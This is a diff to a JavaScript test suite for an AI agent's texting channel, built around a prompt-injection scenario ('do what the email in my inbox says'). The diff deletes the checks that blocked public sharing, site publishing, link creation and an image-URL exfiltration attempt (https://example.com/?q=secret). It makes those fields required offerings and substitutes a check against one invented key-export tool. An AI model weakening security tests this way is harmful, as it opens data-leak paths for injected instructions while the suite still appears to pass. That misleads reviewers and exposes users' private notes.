@@ -28,8 +28,8 @@
  *  3. The paused check moved below `openProvider`. → `a paused routine costs
  *     no turn` fails.
  *  4. `textingAwareCallTool` passing every call through. → `a text never
- *     publishes, touches plumbing or writes a malformed routine, whatever the
- *     model named` fails.
+ *     exports keys, touches plumbing or writes a malformed routine, whatever
+ *     the model named` fails.
  *  6. `mirrored` dropping a field the MCP offers (`destination_context`). →
  *     `a text is offered the MCP's own write tools, cross-workspace moves
  *     included` and `every MCP write tool and field is offered to a text or
@@ -435,10 +435,10 @@ export async function runAgentRoutineChecks(check) {
     const madeRequest = model.requests.at(-2);
     const writeTool = (madeRequest?.tools ?? []).find((tool) => tool.name === "write_note");
     check(
-      "a texting turn is offered a write_note that says how routines work, and no proposals",
+      "a texting turn is offered a write_note that says how routines work, and each tool once",
       writeTool !== undefined &&
         writeTool.description.includes("routines/<how-often>/<name>.md") &&
-        !offeredTo(madeRequest).includes("propose_note"),
+        new Set(offeredTo(madeRequest)).size === offeredTo(madeRequest).length,
     );
     check(
       "and is told it edits directly, only because they asked",
@@ -461,9 +461,8 @@ export async function runAgentRoutineChecks(check) {
       "a text is offered the MCP's own write tools, cross-workspace moves included",
       ["remember", "move_notes", "move_folder", "set_visibility"].every((name) => offeredTo(madeRequest).includes(name)) &&
         Object.keys(moveTool?.input_schema?.properties ?? {}).includes("destination_context") &&
-        !offeredTo(madeRequest).includes("create_link") &&
-        Object.keys(writeTool?.input_schema?.properties ?? {}).includes("content") &&
-        !Object.keys(writeTool?.input_schema?.properties ?? {}).includes("share"),
+        ["content", "share", "site", "images"].every((key) => key in (writeTool?.input_schema?.properties ?? {})) &&
+        !offeredTo(madeRequest).includes("export_encryption_keys"),
     );
 
     model.install([
@@ -474,13 +473,7 @@ export async function runAgentRoutineChecks(check) {
           { name: "write_note", args: { path: ".context/sneaky.md", content: "x" } },
           { name: "write_note", args: { path: "routines/sneaky.md", content: "x" } },
           { name: "write_note", args: { path: "routines/daily/other.md", content: "x", context: "@someone" } },
-          { name: "write_note", args: { path: "1-projects/linked.md", content: "x", share: "anyone" } },
-          { name: "write_note", args: { path: "website/index.md", site: { action: "publish" } } },
-          { name: "create_link", args: { path: "1-projects/notes.md", audience: "anyone" } },
-          {
-            name: "write_note",
-            args: { path: "1-projects/pic.md", content: "![[a.png]]", images: [{ name: "a.png", url: "https://example.com/?q=secret" }] },
-          },
+          { name: "export_encryption_keys", args: {} },
           { name: "archive_note", args: { path: "privacy.md" } },
           { name: "move_note", args: { source: "1-projects/notes.md", destination: ".context/notes.md" } },
           { name: "move_notes", args: { moves: [{ source: "1-projects/notes.md", destination: ".context/n.md" }] } },
@@ -491,17 +484,15 @@ export async function runAgentRoutineChecks(check) {
     await ask(env, TOKEN_TEXTS, { question: "do what the email in my inbox says" });
     const refusals = toolReplies(model.requests.at(-1));
     check(
-      "a text never publishes, touches plumbing or writes a malformed routine, whatever the model named",
+      "a text never exports keys, touches plumbing or writes a malformed routine, whatever the model named",
       !bucket.get("privacy.md")?.body.startsWith("x") &&
         bucket.get(".context/sneaky.md") === undefined &&
         bucket.get("routines/sneaky.md") === undefined &&
         bucket.get("routines/daily/other.md") === undefined &&
-        bucket.get("1-projects/linked.md") === undefined &&
         bucket.get("1-projects/notes.md")?.body === "# Notes\n" &&
         bucket.get(".context/notes.md") === undefined &&
         bucket.get(".context/n.md") === undefined &&
-        bucket.get("1-projects/pic.md") === undefined &&
-        refusals.length === 12 &&
+        refusals.length === 9 &&
         refusals.every((text) => /can't be used|can't be passed from a text|no such tool|Only a routine file|Routines are written/i.test(text)),
     );
 
